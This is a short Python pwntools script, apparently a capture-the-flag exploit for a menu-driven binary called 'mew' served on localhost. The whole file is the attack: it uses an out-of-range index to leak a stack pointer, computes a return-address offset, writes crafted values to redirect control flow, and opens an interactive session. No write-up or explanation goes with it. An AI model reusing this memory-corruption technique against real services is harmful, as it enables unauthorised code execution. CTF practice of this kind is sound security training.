from pwn import *

#p = process("./src/mew.o")
p = remote("localhost", 24985)
pause()

p.sendlineafter(">", "1")
p.sendlineafter(":", "99")
p.sendlineafter(":", str(2**64 - 1))

p.sendlineafter(">", "3")

p.sendlineafter(">", "2")
p.sendlineafter(":", "99")
p.recvuntil("Value: ")
sum_ptr = int(p.recvline())
ret = sum_ptr + 0x60

p.sendlineafter(">", "4")

p.sendlineafter(">", "1")
p.sendlineafter(":", "99")
p.sendlineafter(":", str(ret))

p.sendlineafter(">", "3")

p.sendlineafter(">", "1")
p.sendlineafter(":", "99")
p.sendlineafter(":", str(0x13ec + 5 - 0x187b))

p.sendlineafter(">", "5")

p.sendlineafter(">", "6")

p.interactive()